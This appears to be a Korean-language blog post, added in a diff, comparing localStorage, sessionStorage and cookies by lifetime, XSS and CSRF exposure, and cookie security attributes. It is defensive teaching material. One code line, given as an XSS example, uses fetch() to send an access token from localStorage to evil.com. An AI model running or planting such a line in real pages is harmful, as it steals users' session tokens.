@@ -1,0 +1,115 @@
+---
+title: 브라우저 스토리지 비교 — localStorage, sessionStorage, Cookie
+date: '2026-05-05'
+category: Frontend
+tags:
+  - Browser
+  - Security
+  - Cookie
+  - Web Storage
+  - XSS
+summary: >-
+  브라우저의 localStorage, sessionStorage, Cookie는 수명과 보안 모델이 전혀 다르다. 어떤 데이터를
+  어디에 저장하느냐에 따라 XSS, CSRF 노출 여부와 토큰 탈취 위험이 결정된다.
+thumbnail: /thumbnails/browser-storage-security.svg
+---
+
+브라우저의 localStorage, sessionStorage, Cookie는 보안과 수명 측면에서 어떻게 다를까 — 세 저장소는 단순히 용량과 편의성만 다른 것이 아니라, 근본적인 보안 모델이 다르다.
+
+## 한눈에 비교
+
+| 항목 | localStorage | sessionStorage | Cookie |
+|------|-------------|----------------|--------|
+| 수명 | 명시적 삭제 전까지 영구 | 탭/브라우저 닫으면 삭제 | `Expires` / `Max-Age` 설정값 |
+| 용량 | 약 5MB | 약 5MB | 약 4KB |
+| 범위 | 동일 출처 (origin) | 동일 탭 + 동일 출처 | 도메인/경로 단위 설정 가능 |
+| JS 접근 | 가능 | 가능 | `httpOnly` 아닐 때만 가능 |
+| 서버 자동 전송 | 불가 | 불가 | 모든 요청에 자동 포함 |
+| XSS 취약도 | 높음 | 높음 | `httpOnly`이면 낮음 |
+| CSRF 위험 | 없음 | 없음 | 있음 (`SameSite`로 완화) |
+
+## localStorage — 편리하지만 XSS에 노출
+
+```javascript
+localStorage.setItem('access_token', token)
+const token = localStorage.getItem('access_token')
+```
+
+페이지가 XSS 공격에 뚫리면 공격자는 `localStorage`에 저장된 모든 값을 읽을 수 있다. `document.cookie`와 달리 `httpOnly` 같은 보호 메커니즘이 없기 때문이다.
+
+```javascript
+// XSS 공격 예시
+fetch('https://evil.com/steal?data=' + localStorage.getItem('access_token'))
+```
+
+인증 토큰을 `localStorage`에 저장하는 방식은 XSS에 취약하다. 그러나 CSRF 공격에는 면역인데, 요청에 자동으로 포함되지 않기 때문이다.
+
+## sessionStorage — 탭 격리지만 같은 XSS 취약점
+
+`sessionStorage`는 탭 단위로 격리된다. 같은 사이트를 여러 탭으로 열어도 데이터가 공유되지 않는다. 탭을 닫으면 자동 삭제된다.
+
+```javascript
+sessionStorage.setItem('draft', JSON.stringify(formData))
+```
+
+일시적인 폼 상태, 임시 작업 데이터를 저장하기에 적합하다. 그러나 JS에서 접근 가능하므로 XSS에는 `localStorage`와 동일하게 취약하다.
+
+## Cookie — 보안 속성이 핵심
+
+쿠키는 서버가 `Set-Cookie` 헤더로 설정하며, 이후 동일 도메인으로 나가는 모든 HTTP 요청에 자동으로 포함된다. 이 자동 포함 특성이 CSRF 공격의 원인이 된다.
+
+### 주요 보안 속성
+
+```
+Set-Cookie: session=abc123;
+  HttpOnly;         ← JS에서 접근 불가 → XSS 방어
+  Secure;           ← HTTPS 연결에서만 전송
+  SameSite=Strict;  ← 타 사이트 요청에 쿠키 미포함 → CSRF 방어
+  Path=/;
+  Max-Age=3600
+```
+
+**HttpOnly**: 가장 중요한 속성이다. `document.cookie`로 접근할 수 없어 XSS로 쿠키 값을 훔칠 수 없다.
+
+**SameSite**: CSRF를 막는 핵심 속성이다.
+- `Strict`: 외부 사이트에서 발생한 모든 요청에 쿠키를 보내지 않는다.
+- `Lax`: GET 요청에는 허용, POST 등에는 차단한다.
+- `None`: 모든 크로스 사이트 요청에 포함 (반드시 `Secure`와 함께 사용).
+
+**Secure**: HTTPS 연결에서만 쿠키를 전송한다. HTTP 통신에서 쿠키가 평문으로 노출되는 것을 막는다.
+
+## 공격 모델별 비교
+
+### XSS (Cross-Site Scripting)
+
+공격자가 악성 스크립트를 주입해 실행시키는 공격이다.
+
+```
+localStorage/sessionStorage → JS로 직접 접근 가능 → 토큰 탈취
+Cookie (httpOnly 없음)      → document.cookie로 접근 가능 → 탈취
+Cookie (httpOnly 있음)      → JS 접근 불가 → 탈취 불가
+```
+
+### CSRF (Cross-Site Request Forgery)
+
+사용자가 의도하지 않은 요청을 공격자 사이트에서 발생시키는 공격이다.
+
+```
+localStorage/sessionStorage → 요청 자동 포함 안 됨 → CSRF 위험 없음
+Cookie (SameSite 없음)      → 자동 포함 → CSRF 위험
+Cookie (SameSite=Strict)    → 크로스 사이트 자동 포함 안 됨 → 방어
+```
+
+## 사용 시나리오별 권장
+
+| 데이터 유형 | 권장 저장소 | 이유 |
+|------------|------------|------|
+| 인증 토큰 (JWT) | httpOnly Cookie | XSS 방어 + 자동 전송 |
+| 사용자 설정, 테마 | localStorage | 민감하지 않음, 영구 저장 필요 |
+| 임시 폼 데이터 | sessionStorage | 탭 종료 시 자동 삭제 |
+| 장바구니 (비로그인) | localStorage | 영구성 필요 |
+| CSRF 토큰 | Cookie (SameSite=Strict) + 헤더 검증 | 이중 검증 |
+
+## 정리
+
+세 저장소의 선택은 단순한 용량 문제가 아니라 공격 모델에 대한 방어 설계다. 인증 토큰처럼 민감한 값은 `httpOnly` + `Secure` + `SameSite=Strict` 속성의 쿠키에 저장하고, `localStorage`는 탈취되어도 서비스 핵심 기능에 영향 없는 데이터에만 사용하는 것이 기본 원칙이다.
